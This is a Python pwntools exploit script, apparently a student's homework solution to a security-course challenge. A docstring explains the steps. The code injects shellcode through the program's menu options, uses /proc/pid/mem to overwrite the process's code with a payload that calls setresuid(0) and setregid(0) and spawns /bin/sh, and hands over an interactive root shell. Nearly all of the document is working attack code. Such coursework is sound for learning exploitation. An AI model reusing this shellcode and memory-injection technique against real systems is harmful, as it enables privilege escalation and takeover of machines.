#!/usr/bin/env python3

UID = 119362914
Name = "Sparsh Mehta / hutgrabber"
"Homework 1"

import sys
from time import sleep
import pwn
import os

"""
Steps to perform injection using PTRACE:
1. For performing this exploit, the I/O needs to be handled. The menu that is printed, has many options. All of this can be handled
    using the io.sendline() function.
2. There is a little issue that is present that arises while handling the IO of the program. There is an extra line that gets printed
    when the arg GDB is provided with the program. To handle this, there is an `if` statement that runs while receiving IO.
3. For creating the payload for this exploit, we need to refer to this documentation, which will make it easier to understand how to perform
    specific syscalls:
    https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md
4. First the shellcraft module can be used to first call the `setresuid()` function, the `setregid()` function and finally the `sh()` function
    which will first make the binary suid, and also set the effective group to the 'root' group and then finally call the `/bin/sh` shell.
5. GDB can be used to get the offset at which the payload has to be injected, and some trial & error needs to be done to see what the length of the
    payload should be so that it nicely fits in memory.
6. After this, the output of shellcraft can be appended to the end of ourshellcode.
7. For the rest of our shellcode, we need to use the `open()`, `mov()`, `lseek()` and `write()` syscalls along with the `infloop()` to perform the
    write properly. Apart from all this, we also need to write a little bit of assembly, to create space on the stack and set the `r12` register like
    it is mentioned in the chromium documentation.
8. Apart from this, the PID of the program needs to be saved and used to open the memory of the program using the `/proc/pid/mem` location.
8. Once this shellcode is generated, it can be sent into the program using `option 1` and following the program which allows us to input our shellcode
    after setting a memory value.
"""

def start(argv=[], *a, **kw):
    if pwn.args.GDB: # use the gdb script, sudo apt install gdbserver
        return pwn.gdb.debug([binPath] + argv, gdbscript=gdbscript, *a, **kw, aslr=True)
    elif pwn.args.REMOTE: # ['server', 'port']
        return pwn.remote(sys.argv[1], sys.argv[2], *a, **kw)
    else: # run locally, no GDB
        return pwn.process([binPath]+argv, *a, **kw )


# Binary Path
binPath = "/challenge/homework"

gdbscript = """
break *main+738
continue
""".format(**locals())

elf = pwn.context.binary = pwn.ELF(binPath, checksec=False)
pwn.context.log_level = "critical"


io=start()
io.recvlines(5) # main menu
io.sendline(b"2")
if pwn.args.GDB:
    io.recvlines(2) # Debug information:
else:
    io.recvline()
_, pid = io.recvline().strip().split(b" = ")
pid = pid.decode()
offset=0x401830
shell = pwn.asm(pwn.shellcraft.setresuid(0)+pwn.shellcraft.setregid(0)+pwn.shellcraft.sh())
len_of_payload = 98
shellcode = pwn.asm(f"mov r12, [rsp+0x38]; add r12, {len_of_payload};")
shellcode += pwn.asm(pwn.shellcraft.amd64.open(f"/proc/{pid}/mem", 1))
shellcode += pwn.asm(pwn.shellcraft.amd64.mov('r9','rax'))
shellcode += pwn.asm(pwn.shellcraft.amd64.lseek('r9', offset, 0))
shellcode += pwn.asm(pwn.shellcraft.write('r9','r12',len(shell)))
shellcode += pwn.asm(pwn.shellcraft.infloop())
shellcode += shell

io.recvlines(5) # main menu
io.sendline(b"1")

io.recvline()  # how big do you want your memory to be?
io.sendline(b"400")

io.recvline()
io.sendline(b"6") # permissions

io.recvline() # what would you like to include?
io.sendline(shellcode)
_, buffer_address = io.recvline().strip().split(b" at ") # wrote buffer at
io.recvlines(5)
io.sendline(b"3")
io.recvline()
io.sendline(buffer_address)
io.interactive()
